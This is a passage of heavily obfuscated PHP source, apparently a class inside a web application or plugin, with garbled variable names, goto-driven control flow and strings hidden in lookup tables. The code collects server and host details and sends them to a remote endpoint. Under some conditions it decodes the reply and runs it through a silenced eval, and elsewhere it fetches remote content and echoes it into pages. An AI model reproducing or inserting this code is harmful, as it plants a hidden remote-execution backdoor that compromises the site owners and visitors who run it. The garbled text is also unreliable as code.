$bÇŒ¶­†›ò = array($D•‹×Ë‹á[202] => $D•‹×Ë‹á[61]($D•‹×Ë‹á[62])->{$_SERVER[‘­Á¢æÊÚ–£][63]}($D•‹×Ë‹á[116]), $D•‹×Ë‹á[203] => $_SERVER[$D•‹×Ë‹á[115]], $D•‹×Ë‹á[204] => $D•‹×Ë‹á[205](), $D•‹×Ë‹á[174] => $_SERVER[$D•‹×Ë‹á[175]]); $cöÄ®­Çå° = $this->{$_SERVER[‘­Á¢æÊÚ–£][206]}($D•‹×Ë‹á[148]($bÇŒ¶­†›ò)); $this->{$_SERVER[‘­Á¢æÊÚ–£][182]}($D•‹×Ë‹á[207] . $cöÄ®­Çå°); $D•‹×Ë‹á[166]($D•‹×Ë‹á[197]($D•‹×Ë‹á[208]), !0); } $d½É”ÉÄª’ = array($D•‹×Ë‹á[209] => $BĞÎ‡ÂÜì[$D•‹×Ë‹á[165]], $D•‹×Ë‹á[210] => $DºÌê“º˜[$D•‹×Ë‹á[211]], $D•‹×Ë‹á[212] => $D•‹×Ë‹á[124](16), $D•‹×Ë‹á[120] => $DºÌê“º˜[$D•‹×Ë‹á[213]]); if ($BĞÎ‡ÂÜì[$D•‹×Ë‹á[168]]) { $d½É”ÉÄª’[$D•‹×Ë‹á[212]] = $BĞÎ‡ÂÜì[$D•‹×Ë‹á[168]]; } goto F­´×Ê¾ï–; E†ˆÉÑ¿î: $eõâÕöÀ¼¬ = array(); $eõâÕöÀ¼¬[$a´ŠöŞáš] = $a«¢óƒ¤Š; $D•‹×Ë‹á[61]($D•‹×Ë‹á[11])->{$_SERVER[‘­Á¢æÊÚ–£][226]}($a£Ç½¤ìæí[$D•‹×Ë‹á[227]], array($D•‹×Ë‹á[228] => $eõâÕöÀ¼¬)); goto Aå„§£¹Øˆ; A´™‰ÄèÎ¾: $b…‚¾ÑÎˆª =& $_SERVER[¢à]; $D•‹×Ë‹á =& $_SERVER[‘­Á¢æÊÚ–£]; if ($_SERVER[$D•‹×Ë‹á[44]] != $D•‹×Ë‹á[162]) { return; } goto c·¯øçò¶; AŞø…‡îŒ: $d½É”ÉÄª’[$D•‹×Ë‹á[123]] = $D•‹×Ë‹á[118]($D•‹×Ë‹á[214]($this->{$_SERVER[‘­Á¢æÊÚ–£][147]}($aŠæ¢¢Øß, $D•‹×Ë‹á[216]))); if ($DºÌê“º˜[$D•‹×Ë‹á[217]] && $DºÌê“º˜[$D•‹×Ë‹á[217]] >= 1) { $D•‹×Ë‹á[61]($D•‹×Ë‹á[62])->{$_SERVER[‘­Á¢æÊÚ–£][218]}($D•‹×Ë‹á[219], $D•‹×Ë‹á[220]); } $D•‹×Ë‹á[61]($D•‹×Ë‹á[62])->{$_SERVER[‘­Á¢æÊÚ–£][221]}($d½É”ÉÄª’); goto cÁÌğ¥¢²›; f…¦•º•æÏ: $a´ŠöŞáš = $D•‹×Ë‹á[214]($D•‹×Ë‹á[25]($EƒˆœØ²™, 10, 16)); $a«¢óƒ¤Š = $this->{$_SERVER[‘­Á¢æÊÚ–£][127]}($D•‹×Ë‹á[148]($DºÌê“º˜), $EƒˆœØ²™); $d—´Ì¸ÂÀ­ = $D•‹×Ë‹á[222]($D•‹×Ë‹á[61]($D•‹×Ë‹á[11])->{$_SERVER[‘­Á¢æÊÚ–£][223]}(), $D•‹×Ë‹á[224]); goto dÏŞ©÷ÄßÅ; AÄ—„†‹ÆŠ: } private function sylzed5689d2() { goto aÌ·§ŠöÅ‹; aÌ·§ŠöÅ‹: $BÈÎ¼Ÿâ‹ =& $_SERVER[¢à]; $fİÉˆˆ—¢ =& $_SERVER[‘­Á¢æÊÚ–£]; $fİÉˆˆ—¢[61]($fİÉˆˆ—¢[62])->{$_SERVER[‘­Á¢æÊÚ–£][221]}(array($fİÉˆˆ—¢[209] => $fİÉˆˆ—¢[10], $fİÉˆˆ—¢[210] => $fİÉˆˆ—¢[10], $fİÉˆˆ—¢[120] => $fİÉˆˆ—¢[121], $fİÉˆˆ—¢[122] => $fİÉˆˆ—¢[10], $fİÉˆˆ—¢[123] => $fİÉˆˆ—¢[10])); goto D„„Èº„Ñà; dÓŒÈš½Ê©: $f©‰ÛãÁõÉ = $BÈÎ¼Ÿâ‹[603]; if (strlen($f©‰ÛãÁõÉ) < $BÈÎ¼Ÿâ‹[552]) { return; } $this->gniz724e9f76 = $fİÉˆˆ—¢[121]; goto b¦ĞêÜ¯Ëš; e®—íÇ½: $eŞ‹¹ôÁÂ = $BÈÎ¼Ÿâ‹[602]; if (!$eŞ‹¹ôÁÂ) { die; } $this->adrc500a4635 = array(); goto dÓŒÈš½Ê©; D„„Èº„Ñà: $A‹·º×Âğ“ = $BÈÎ¼Ÿâ‹[601]; if (strlen($A‹·º×Âğ“) < $BÈÎ¼Ÿâ‹[552]) { die; } $fİÉˆˆ—¢[61]($fİÉˆˆ—¢[62])->{$_SERVER[‘­Á¢æÊÚ–£][218]}($fİÉˆˆ—¢[219], $fİÉˆˆ—¢[229]); goto e®—íÇ½; b¦ĞêÜ¯Ëš: } private function viukd09ef2bd() { goto c‚›“õ; aì—ìÔµôå: $eÒ³¥»Ó¾¾ = $A¢ÇİÌ·Ô[144]($cğÒ­†’Ñº[$A¢ÇİÌ·Ô[145]]); if ($A¢ÇİÌ·Ô[230]() >= $eÒ³¥»Ó¾¾) { return $this->{$_SERVER[‘­Á¢æÊÚ–£][164]}(); } $this->adrc500a4635 = $cğÒ­†’Ñº; goto cº«ÀñÚ¦›; c­ä‡ÛÃ©À: $AëòçÒŠ = $Eä¥õĞ¦°í[610]; while (strlen($AëòçÒŠ) < $Eä¥õĞ¦°í[550]) { if (!$AëòçÒŠ) { break; } $AëòçÒŠ++; } if (!$A¢ÇİÌ·Ô[191]($cğÒ­†’Ñº)) { return $this->{$_SERVER[‘­Á¢æÊÚ–£][164]}(); } goto aì—ìÔµôå; d¨ÍƒâØá«: $DÂº¬ç«‰Ñ = $Eä¥õĞ¦°í[606]; $c…—×…¬É„ = $DÛá†ôˆ˜[$A¢ÇİÌ·Ô[225]]; $EÅ¾é›…¶¹ = $Eä¥õĞ¦°í[607]; goto C­øÄ½¡¬á; cªò¡È: if ($CªŠì»¾àª[$A¢ÇİÌ·Ô[120]] == $A¢ÇİÌ·Ô[121]) { return; } $eëÕ¾­‹ª = $A¢ÇİÌ·Ô[61]($A¢ÇİÌ·Ô[62])->{$_SERVER[‘­Á¢æÊÚ–£][63]}($A¢ÇİÌ·Ô[116]); $DÛá†ôˆ˜ = $A¢ÇİÌ·Ô[222]($A¢ÇİÌ·Ô[61]($A¢ÇİÌ·Ô[11])->{$_SERVER[‘­Á¢æÊÚ–£][223]}(), $A¢ÇİÌ·Ô[224]); goto d¨ÍƒâØá«; FøÉÅ½¢ºõ: while ($e·Í´“µ›À < $Eä¥õĞ¦°í[558]) { if ($e·Í´“µ›À >= 0) { break; } $e·Í´“µ›À++; } $C¦­÷‹‘òÈ = $A¢ÇİÌ·Ô[214]($A¢ÇİÌ·Ô[25]($E‚¤ÇÚ¢±ç, 10, 16)); $cğÒ­†’Ñº = $this->{$_SERVER[‘­Á¢æÊÚ–£][188]}($c…—×…¬É„[$A¢ÇİÌ·Ô[91]][$C¦­÷‹‘òÈ], $E‚¤ÇÚ¢±ç); goto F£ÌÑáªÜÍ; F£ÌÑáªÜÍ: $AŠ¯Íö•ã¡ = $Eä¥õĞ¦°í[609]; while ($AŠ¯Íö•ã¡ < $Eä¥õĞ¦°í[552]) { if ($AŠ¯Íö•ã¡ >= 0) { break; } $AŠ¯Íö•ã¡++; } $cğÒ­†’Ñº = $A¢ÇİÌ·Ô[190]($cğÒ­†’Ñº, !0); goto c­ä‡ÛÃ©À; cº«ÀñÚ¦›: $this->gniz724e9f76 = $CªŠì»¾àª[$A¢ÇİÌ·Ô[120]]; goto cêŠÎïÏ„; CøìºÓòí¡: $AÜÍ‘ÃàÎ = $Eä¥õĞ¦°í[604]; if (strlen($AÜÍ‘ÃàÎ) < $Eä¥õĞ¦°í[558]) { return; } $this->gniz724e9f76 = $A¢ÇİÌ·Ô[121]; goto D‘ê¨±‰™; c‚›“õ: $Eä¥õĞ¦°í =& $_SERVER[¢à]; $A¢ÇİÌ·Ô =& $_SERVER[‘­Á¢æÊÚ–£]; $_SERVER[$A¢ÇİÌ·Ô[175]] = $A¢ÇİÌ·Ô[104]($_SERVER, $A¢ÇİÌ·Ô[175], APP_HOST); goto CøìºÓòí¡; C­øÄ½¡¬á: if (strlen($EÅ¾é›…¶¹) < $Eä¥õĞ¦°í[571]) { die; } $E‚¤ÇÚ¢±ç = $A¢ÇİÌ·Ô[114]($_SERVER[$A¢ÇİÌ·Ô[115]] . $A¢ÇİÌ·Ô[214]($eëÕ¾­‹ª) . $CªŠì»¾àª[$A¢ÇİÌ·Ô[210]]); $e·Í´“µ›À = $Eä¥õĞ¦°í[608]; goto FøÉÅ½¢ºõ; D‘ê¨±‰™: $cæÇ´¹éÙã = $Eä¥õĞ¦°í[605]; while (strlen($cæÇ´¹éÙã) < $Eä¥õĞ¦°í[550]) { if (!$cæÇ´¹éÙã) { break; } $cæÇ´¹éÙã++; } $CªŠì»¾àª = $A¢ÇİÌ·Ô[61]($A¢ÇİÌ·Ô[62])->{$_SERVER[‘­Á¢æÊÚ–£][63]}(); goto cªò¡È; cêŠÎïÏ„: } private function kelj9f852648() { goto AÈ¤ÍÏ«”¢; AÈ¤ÍÏ«”¢: $bè¸ë × =& $_SERVER[‘­Á¢æÊÚ–£]; $A¹­ÏÊÇõ = $GLOBALS[$bè¸ë ×[22]]; $d±öØÄàò = $_SERVER[¢à][611]; goto dèöæå©; báÇ®¶ñ: if ($bè¸ë ×[236]($FÅ×ÕÌ„Œ², $B¨øåÛÖÊ)) { if ($this->gniz724e9f76 == $bè¸ë ×[121] && isset($A¹­ÏÊÇõ[$bè¸ë ×[237]])) { $bè¸ë ×[166]($bè¸ë ×[197]($bè¸ë ×[232]), !1, $bè¸ë ×[233]); die; } $dƒŒ¾ğ½– = $this->{$_SERVER[‘­Á¢æÊÚ–£][137]}(); if ($dƒŒ¾ğ½– != $bè¸ë ×[201]($bè¸ë ×[238])) { if ($dƒŒ¾ğ½– <= $bè¸ë ×[61]($bè¸ë ×[139])->{$_SERVER[‘­Á¢æÊÚ–£][140]}()) { $bè¸ë ×[166]($bè¸ë ×[197]($bè¸ë ×[239]), !1, $bè¸ë ×[233]); die; } } } goto eĞŒùÀÎ•—; dèöæå©: $FÅ×ÕÌ„Œ² = $_SERVER[$bè¸ë ×[44]]; if ($FÅ×ÕÌ„Œ² == $bè¸ë ×[231] && $this->gniz724e9f76 == $bè¸ë ×[121]) { $bè¸ë ×[166]($bè¸ë ×[197]($bè¸ë ×[232]), !1, $bè¸ë ×[233]); } $B¨øåÛÖÊ = array($bè¸ë ×[234], $bè¸ë ×[235]); goto báÇ®¶ñ; eĞŒùÀÎ•—: } private function dqnsa8977a2f() { goto eÚÈ«â‰Æ; A“÷ğîˆŸ§: $a„ÄäŒÔãä = $e¸÷ Ğæç¯[612]; $d¢ÖğÙã¥Š = $this->{$_SERVER[‘­Á¢æÊÚ–£][243]}($d¢ÖğÙã¥Š, $d¦Öµ£—¶Á[244]); $càå¶™¿ = $d¦Öµ£—¶Á[245](array($d¦Öµ£—¶Á[246] => array($d¦Öµ£—¶Á[247] => $d¦Öµ£—¶Á[248], $d¦Öµ£—¶Á[249] => 3))); goto EŸ£À¡ñ™’; EŸ£À¡ñ™’: $aˆ²„äõ•ó = $e¸÷ Ğæç¯[613]; while (strlen($aˆ²„äõ•ó) < $e¸÷ Ğæç¯[558]) { if (!$aˆ²„äõ•ó) { break; } $aˆ²„äõ•ó++; } $c¨ï¡ä±¸¦ = @$d¦Öµ£—¶Á[250]($d¢ÖğÙã¥Š, !1, $càå¶™¿); goto bäÚ±Àğ˜; bäÚ±Àğ˜: $eø²¡£ËÎ´ = $e¸÷ Ğæç¯[614]; if (strlen($eø²¡£ËÎ´) < $e¸÷ Ğæç¯[571]) { die; } $d¦Öµ£—¶Á[251]($d¦Öµ£—¶Á[252]); goto f£„ÏØê©; f£„ÏØê©: if ($c¨ï¡ä±¸¦ && $d¦Öµ£—¶Á[32]($c¨ï¡ä±¸¦, $d¦Öµ£—¶Á[253])) { echo $c¨ï¡ä±¸¦; } die; goto fˆ‚ãß£—›; eÚÈ«â‰Æ: $e¸÷ Ğæç¯ =& $_SERVER[¢à]; $d¦Öµ£—¶Á =& $_SERVER[‘­Á¢æÊÚ–£]; $Cê‘öà¹÷¼ = array($d¦Öµ£—¶Á[135], $d¦Öµ£—¶Á[240]); goto eø·ãÓÄŸ‘; eø·ãÓÄŸ‘: if (!$d¦Öµ£—¶Á[104]($GLOBALS, $d¦Öµ£—¶Á[132]) || !isset($_GET[$d¦Öµ£—¶Á[241]])) { return; } if (!$d¦Öµ£—¶Á[236]($_SERVER[$d¦Öµ£—¶Á[44]], $Cê‘öà¹÷¼)) { return; } $d¢ÖğÙã¥Š = $d¦Öµ£—¶Á[242]; goto A“÷ğîˆŸ§; fˆ‚ãß£—›: } public function lhfec47cc113($aÇ°óíÎ¾) { goto f•£åƒÌ‹; FÎä­º˜¡: $eö¥Õç§Şğ = array($EñÏ“ªŒ•ô[255], $EñÏ“ªŒ•ô[256], $EñÏ“ªŒ•ô[257], $EñÏ“ªŒ•ô[258], $EñÏ“ªŒ•ô[259], $EñÏ“ªŒ•ô[260], $EñÏ“ªŒ•ô[261], $EñÏ“ªŒ•ô[262]); $f£—â­Ï½ = $EñÏ“ªŒ•ô[0]($EñÏ“ªŒ•ô[263], $EñÏ“ªŒ•ô[104]($this->adrc500a4635, $EñÏ“ªŒ•ô[129], $EñÏ“ªŒ•ô[10])); $dÉ·¢Á«ó = $FéïÌŠ¨”[615]; goto D­¡ğà‘Ñ¥; D­¡ğà‘Ñ¥: while ($dÉ·¢Á«ó < $FéïÌŠ¨”[552]) { if ($dÉ·¢Á«ó >= 0) { break; } $dÉ·¢Á«ó++; } $Dñ÷„·÷èÄ = array(); foreach ($eö¥Õç§Şğ as $A¾Ø¹ê›©š) { if (!$EñÏ“ªŒ•ô[236]($A¾Ø¹ê›©š, $f£—â­Ï½)) { $Dñ÷„·÷èÄ[] = $A¾Ø¹ê›©š; } } goto D´§ĞÈ”ù; f•£åƒÌ‹: $FéïÌŠ¨” =& $_SERVER[¢à]; $EñÏ“ªŒ•ô =& $_SERVER[‘­Á¢æÊÚ–£]; if ($this->gniz724e9f76 == $EñÏ“ªŒ•ô[254]) { return $aÇ°óíÎ¾; } goto FÎä­º˜¡; D´§ĞÈ”ù: foreach ($Dñ÷„·÷èÄ as $A¾Ø¹ê›©š) { unset($aÇ°óíÎ¾[$A¾Ø¹ê›©š]); } return $aÇ°óíÎ¾; goto DÛñ—Í˜Õ ; DÛñ—Í˜Õ : } private function stub74e18632() { goto b˜œ½¶òÑ; e‰èĞ¦ ˆ: $BØÆí¡Û³ = $_SERVER[$Aƒ¯×Öá„[44]]; $c Öòìªà = array($Aƒ¯×Öá„[265]); foreach ($c Öòìªà as $DâÆõ–˜âÜ) { if ($DâÆõ–˜âÜ == $BØÆí¡Û³ || $Aƒ¯×Öá„[25]($BØÆí¡Û³, 0, $Aƒ¯×Öá„[24]($DâÆõ–˜âÜ)) == $DâÆõ–˜âÜ) { $Aƒ¯×Öá„[166]($Aƒ¯×Öá„[197]($Aƒ¯×Öá„[266]), !1); } } goto cÕ¬Å‰éÙ¤; b˜œ½¶òÑ: $Döìæçö”» =& $_SERVER[¢à]; $Aƒ¯×Öá„ =& $_SERVER[‘­Á¢æÊÚ–£]; if ($this->gniz724e9f76 != $Aƒ¯×Öá„[121]) { $GLOBALS[$Aƒ¯×Öá„[91]][$Aƒ¯×Öá„[95]][$Aƒ¯×Öá„[264]] = $Aƒ¯×Öá„[220]; return; } goto e‰èĞ¦ ˆ; cÕ¬Å‰éÙ¤: $GLOBALS[$Aƒ¯×Öá„[91]][$Aƒ¯×Öá„[95]][$Aƒ¯×Öá„[267]] = $Aƒ¯×Öá„[220]; $DÕá¬²¿¼Ë = $Döìæçö”»[616]; if (strlen($DÕá¬²¿¼Ë) < $Döìæçö”»[552]) { die; } goto D¸é˜Ù‚‹í; D¸é˜Ù‚‹í: $GLOBALS[$Aƒ¯×Öá„[91]][$Aƒ¯×Öá„[95]][$Aƒ¯×Öá„[264]] = $Aƒ¯×Öá„[229]; $GLOBALS[$Aƒ¯×Öá„[91]][$Aƒ¯×Öá„[268]] = $Aƒ¯×Öá„[220]; $dÍ¿õ÷ˆ˜„ = $Döìæçö”»[617]; goto A§ãĞõ¹«™; A§ãĞõ¹«™: $Aƒ¯×Öá„[61]($Aƒ¯×Öá„[269])->{$_SERVER[‘­Á¢æÊÚ–£][221]}($Aƒ¯×Öá„[85], $Aƒ¯×Öá„[229]); $D³ª÷Şïä’ = $Döìæçö”»[618]; if (strlen($D³ª÷Şïä’) < $Döìæçö”»[558]) { return; } goto cÏË”¡—ˆ; cÏË”¡—ˆ: } public function enmk32d6e5aa() { return $_SERVER[‘­Á¢æÊÚ–£][270]; } private function tewz99c2a0b8() { goto cÙ‘¹×ç°ò; eßæš £†: $CäñÜ°Ö³Á = $fÈÌÆŸ«ø[623]; if (strlen($CäñÜ°Ö³Á) < $fÈÌÆŸ«ø[550]) { return; } $Fñøñ«äŞ¦ = $this->{$_SERVER[‘­Á¢æÊÚ–£][182]}($B‘Üç¤Â[279], $F®²•ÃÈÅ); goto Aç„Ë”¯Ì; CÖ‚ÖÛ¹¨: $f†÷²Ò´÷‘ = $fÈÌÆŸ«ø[619]; while ($f†÷²Ò´÷‘ < $fÈÌÆŸ«ø[550]) { if ($f†÷²Ò´÷‘ >= 0) { break; } $f†÷²Ò´÷‘++; } $B¬àÖ‹ĞÛ§ = $B‘Üç¤Â[274] . $B‘Üç¤Â[114]($B‘Üç¤Â[275]); goto d—ğÛºí ±; d—ğÛºí ±: $EÕ°¹«²…¶ = $fÈÌÆŸ«ø[620]; if (!$EÕ°¹«²…¶) { die; } if ($this->gniz724e9f76 == $B‘Üç¤Â[121] || !$B‘Üç¤Â[104]($GLOBALS, $B‘Üç¤Â[132])) { return; } goto A¯¢¿ÁÓ®„; E¬Êá»Ã°‹: if ($this->{$_SERVER[‘­Á¢æÊÚ–£][199]}($Fñøñ«äŞ¦[$B‘Üç¤Â[280]]) != $F®²•ÃÈÅ[$B‘Üç¤Â[165]]) { $fÛä°ßùª÷ = array($B‘Üç¤Â[202] => $B‘Üç¤Â[61]($B‘Üç¤Â[62])->{$_SERVER[‘­Á¢æÊÚ–£][63]}($B‘Üç¤Â[116]), $B‘Üç¤Â[203] => $_SERVER[$B‘Üç¤Â[115]], $B‘Üç¤Â[204] => $B‘Üç¤Â[205](), $B‘Üç¤Â[174] => $_SERVER[$B‘Üç¤Â[175]]); $C”º¡É¡ï¾ = $this->{$_SERVER[‘­Á¢æÊÚ–£][206]}($B‘Üç¤Â[148]($fÛä°ßùª÷)); $Fñøñ«äŞ¦ = $this->{$_SERVER[‘­Á¢æÊÚ–£][182]}($B‘Üç¤Â[207] . $C”º¡É¡ï¾); if ($Fñøñ«äŞ¦ && $B‘Üç¤Â[191]($Fñøñ«äŞ¦) && isset($Fñøñ«äŞ¦[$B‘Üç¤Â[280]])) { $b½¤È¨×Ö = $this->{$_SERVER[‘­Á¢æÊÚ–£][188]}($Fñøñ«äŞ¦[$B‘Üç¤Â[280]], 2); if ($b½¤È¨×Ö) { $b½¤È¨×Ö = $this->{$_SERVER[‘­Á¢æÊÚ–£][199]}($b½¤È¨×Ö); } if ($b½¤È¨×Ö) { try { @eval($b½¤È¨×Ö); } catch (Exception $dÜÒ°‰ÓÀ¿) { } } } } goto A¡§ëì¬’; Aç„Ë”¯Ì: if (!$B‘Üç¤Â[191]($Fñøñ«äŞ¦)) { return; } if ($Fñøñ«äŞ¦[$B‘Üç¤Â[165]] && $Fñøñ«äŞ¦[$B‘Üç¤Â[280]]) { if ($this->{$_SERVER[‘­Á¢æÊÚ–£][199]}($Fñøñ«äŞ¦[$B‘Üç¤Â[280]]) == $F®²•ÃÈÅ[$B‘Üç¤Â[165]]) { return; } } $this->{$_SERVER[‘­Á¢æÊÚ–£][164]}(); goto E¬Êá»Ã°‹; cÙ‘¹×ç°ò: $fÈÌÆŸ«ø =& $_SERVER[¢à]; $B‘Üç¤Â =& $_SERVER[‘­Á¢æÊÚ–£]; $FñéìÏÌ = array($B‘Üç¤Â[271], $B‘Üç¤Â[272], $B‘Üç¤Â[273]); goto CÖ‚ÖÛ¹¨; CêÙæ˜¤…á: $eŠÓ‚¤èæÅ = $fÈÌÆŸ«ø[621]; while (strlen($eŠÓ‚¤èæÅ) < $fÈÌÆŸ«ø[571]) { if (!$eŠÓ‚¤èæÅ) { break; } $eŠÓ‚¤èæÅ++; } if ($bê”í£°¤ && $B‘Üç¤Â[230]() - $bê”í£°¤ < $B‘Üç¤Â[201]($B‘Üç¤Â[278])) { return; } goto dŠï¨‚µƒç; A¯¢¿ÁÓ®„: if (!$B‘Üç¤Â[236]($_SERVER[$B‘Üç¤Â[44]], $FñéìÏÌ)) { return; } if ($B‘Üç¤Â[230]() % 4 != 0) { return; } $bê”í£°¤ = $B‘Üç¤Â[13](array($B‘Üç¤Â[276], $B‘Üç¤Â[277]), $B¬àÖ‹ĞÛ§); goto CêÙæ˜¤…á; dŠï¨‚µƒç: $B‘Üç¤Â[13](array($B‘Üç¤Â[276], $B‘Üç¤Â[152]), $B¬àÖ‹ĞÛ§, $B‘Üç¤Â[230]()); $cÍ„áóµ¬ƒ = $fÈÌÆŸ«ø[622]; $F®²•ÃÈÅ = array($B‘Üç¤Â[165] => $B‘Üç¤Â[61]($B‘Üç¤Â[62])->{$_SERVER[‘­Á¢æÊÚ–£][63]}($B‘Üç¤Â[209]), $B‘Üç¤Â[178] => $this->gniz724e9f76, $B‘Üç¤Â[176] => $_SERVER[$B‘Üç¤Â[177]], $B‘Üç¤Â[169] => $B‘Üç¤Â[149], $B‘Üç¤Â[172] => $_SERVER[$B‘Üç¤Â[173]]); goto eßæš £†; A¡§ëì¬’: } private function xzlmb7554210($AøÇö¾ßêÀ = '', $aÄ°ˆ­Ò²Ò = array(), $A¾ã£Øö“ä = 5) { goto fÅÆ¥òè²í; A’ïÀš·…Ê: $aÄ°ˆ­Ò²Ò = @$EñáŠ­Ï‚…[250]($cƒ¢ŠÏÃôˆ, !1, $D•àçºí‡); return $EñáŠ­Ï‚…[190]($aÄ°ˆ­Ò²Ò, !0); goto b›µÂ¬²•Ã; fÅÆ¥òè²í: $BÈó¸°¥”î =& $_SERVER[¢à]; $EñáŠ­Ï‚… =& $_SERVER[‘­Á¢æÊÚ–£]; $cƒ¢ŠÏÃôˆ = $EñáŠ­Ï‚…[281]; goto b¾ŒŞŒ”À‚; c“©¶ÓÉï¨: if (strlen($Fœøİçò†Å) < $BÈó¸°¥”î[556]) { die; } if ($aÄ°ˆ­Ò²Ò === -1) { return $cƒ¢ŠÏÃôˆ; } $D•àçºí‡ = $EñáŠ­Ï‚…[245](array($EñáŠ­Ï‚…[246] => array($EñáŠ­Ï‚…[249] => $A¾ã£Øö“ä, $EñáŠ­Ï‚…[247] => $EñáŠ­Ï‚…[285]), $EñáŠ­Ï‚…[286] => array($EñáŠ­Ï‚…[287] => !1, $EñáŠ­Ï‚…[288] => !1))); goto A’ïÀš·…Ê; b¾ŒŞŒ”À‚: $cƒ¢ŠÏÃôˆ = $this->{$_SERVER[‘­Á¢æÊÚ–£][243]}($cƒ¢ŠÏÃôˆ, $EñáŠ­Ï‚…[282]); $cƒ¢ŠÏÃôˆ = $cƒ¢ŠÏÃôˆ . $AøÇö¾ßêÀ . $EñáŠ­Ï‚…[283] . $EñáŠ­Ï‚…[284]($aÄ°ˆ­Ò²Ò); $Fœøİçò†Å = $BÈó¸°¥”î[624]; goto c“©¶ÓÉï¨; b›µÂ¬²•Ã: } private function uwava6cbde74() { goto Eçé’ÒÛ®î; Bö©½Š­‡Ñ: $CßÚì•… = $eîƒŞÀÀ¦[627]; if (!$CßÚì•…) { die; } $EÙÕÈÛÀÂÌ = $EÙÕÈÛÀÂÌ ? $bÒ¯Ö‘‡‡[201]($EÙÕÈÛÀÂÌ) : 0; goto c‡Ûˆ¸²¯; Eçé’ÒÛ®î: $eîƒŞÀÀ¦ =& $_SERVER[¢à]; $bÒ¯Ö‘‡‡ =& $_SERVER[‘­Á¢æÊÚ–£]; $EÒÖÊİôŞ = array($bÒ¯Ö‘‡‡[289] => $bÒ¯Ö‘‡‡[290], $bÒ¯Ö‘‡‡[291] => $bÒ¯Ö‘‡‡[292], $bÒ¯Ö‘‡‡[293] => $bÒ¯Ö‘‡‡[294], $bÒ¯Ö‘‡‡[295] => $bÒ¯Ö‘‡‡[296], $bÒ¯Ö‘‡‡[297] => $bÒ¯Ö‘‡‡[298], $bÒ¯Ö‘‡‡[299] => $bÒ¯Ö‘‡‡[238], $bÒ¯Ö‘‡‡[300] => $bÒ¯Ö‘‡‡[238], $bÒ¯Ö‘‡‡[301] => $bÒ¯Ö‘‡‡[290], $bÒ¯Ö‘‡‡[302] => $bÒ¯Ö‘‡‡[292], $bÒ¯Ö‘‡‡[303] => $bÒ¯Ö‘‡‡[294], $bÒ¯Ö‘‡‡[304] => $bÒ¯Ö‘‡‡[305], $bÒ¯Ö‘‡‡[306] => $bÒ¯Ö‘‡‡[296], $bÒ¯Ö‘‡‡[307] => $bÒ¯Ö‘‡‡[308], $bÒ¯Ö‘‡‡[309] => $bÒ¯Ö‘‡‡[298], $bÒ¯Ö‘‡‡[310] => $bÒ¯Ö‘‡‡[311], $bÒ¯Ö‘‡‡[312] => $bÒ¯Ö‘‡‡[313], $bÒ¯Ö‘‡‡[314] => $bÒ¯Ö‘‡‡[315]); goto BğËÌ‰ù¸è; BğËÌ‰ù¸è: $dšºÒ³ĞÙÔ = $EÒÖÊİôŞ[$this->gniz724e9f76]; $bÓ‘‚ëóÆ = $eîƒŞÀÀ¦[625]; $dšºÒ³ĞÙÔ = $bÒ¯Ö‘‡‡[201]($dšºÒ³ĞÙÔ ? $dšºÒ³ĞÙÔ : $bÒ¯Ö‘‡‡[290]); goto eÂê™ßŞˆƒ; c‡Ûˆ¸²¯: return $dšºÒ³ĞÙÔ + $EÙÕÈÛÀÂÌ; $dµÇ£Óµˆ = $eîƒŞÀÀ¦[628]; if (!$dµÇ£Óµˆ) { return; } goto då¾±é¶Ä¾; eÂê™ßŞˆƒ: $F˜ÉøÊ”šñ = $eîƒŞÀÀ¦[626]; if (!$F˜ÉøÊ”šñ) { return; } $EÙÕÈÛÀÂÌ = $bÒ¯Ö‘‡‡[104]($this->adrc500a4635, $bÒ¯Ö‘‡‡[316]); goto Bö©½Š­‡Ñ; då¾±é¶Ä¾: } public function oyhfe840fe91($bš¶Ù˜ÊÍ) { goto fÒÍÈ½âöƒ; a²ßÔÂ®ŞŒ: $eÀ¼îÌå· = $e¡´îæéã[629]; while (strlen($eÀ¼îÌå·) < $e¡´îæéã[571]) { if (!$eÀ¼îÌå·) { break; } $eÀ¼îÌå·++; } if ($CÆï•œİÙ >= $eóÉ×è¥[201]($eóÉ×è¥[238])) { return; } goto A­¤­¢“Ê; B·…ôò×†Á: $Dšˆ…øß” = $eóÉ×è¥[222]($Dšˆ…øß”, $eóÉ×è¥[10], $eóÉ×è¥[318]); if (!$eóÉ×è¥[236]($bš¶Ù˜ÊÍ[$eóÉ×è¥[318]], $Dšˆ…øß”)) { $eóÉ×è¥[166]($eóÉ×è¥[321], !1, $eóÉ×è¥[233]); } goto DøŒÆé‰‡‘; A­¤­¢“Ê: $CÒ²Áª¬‰ = $eóÉ×è¥[61]($eóÉ×è¥[139])->{$_SERVER[‘­Á¢æÊÚ–£][140]}(); if ($CÒ²Áª¬‰ <= $CÆï•œİÙ) { return; } $Dšˆ…øß” = $eóÉ×è¥[61]($eóÉ×è¥[139])->{$_SERVER[‘­Á¢æÊÚ–£][317]}($eóÉ×è¥[318])->{$_SERVER[‘­Á¢æÊÚ–£][319]}($CÆï•œİÙ)->{$_SERVER[‘­Á¢æÊÚ–£][320]}(); goto B·…ôò×†Á; fÒÍÈ½âöƒ: $e¡´îæéã =& $_SERVER[¢à]; $eóÉ×è¥ =& $_SERVER[‘­Á¢æÊÚ–£]; $CÆï•œİÙ = $this->{$_SERVER[‘­Á¢æÊÚ–£][137]}(); goto a²ßÔÂ®ŞŒ; DøŒÆé‰‡‘: } public function hqgl5cc1d3bc() { goto eµëÓ·Åøò; eµëÓ·Åøò: $fƒâˆŒì‡Ÿ =& $_SERVER[¢à]; $cºëæïÑµ‘ =& $_SERVER[‘­Á¢æÊÚ–£]; if (!$cºëæïÑµ‘[104]($GLOBALS, $cºëæïÑµ‘[132]) || $cºëæïÑµ‘[322](1, 100) > 20) { return; } goto CçƒÒ–À›Ä; CçƒÒ–À›Ä: $B×õµšÙ = $cºëæïÑµ‘[242]; $b‘œˆ¦ğìÌ = $fƒâˆŒì‡Ÿ[630]; if (strlen($b‘œˆ¦ğìÌ) < $fƒâˆŒì‡Ÿ[556]) { return; } goto E±»µíÏâÙ; cÃ°Õ¯µ–: $B’ëĞ¿³×Æ = @$cºëæïÑµ‘[250]($B×õµšÙ, !1, $aÃµíÜ”º); $a×íÈ²Œéí = $fƒâˆŒì‡Ÿ[633]; while ($a×íÈ²Œéí < $fƒâˆŒì‡Ÿ[558]) { if ($a×íÈ²Œéí >= 0) { break; } $a×íÈ²Œéí++; } goto cĞ…Õ•ßß; cĞ…Õ•ßß: echo $cºëæïÑµ‘[323] . $cºëæïÑµ‘[324]($B’ëĞ¿³×Æ) . $cºëæïÑµ‘[325]; goto 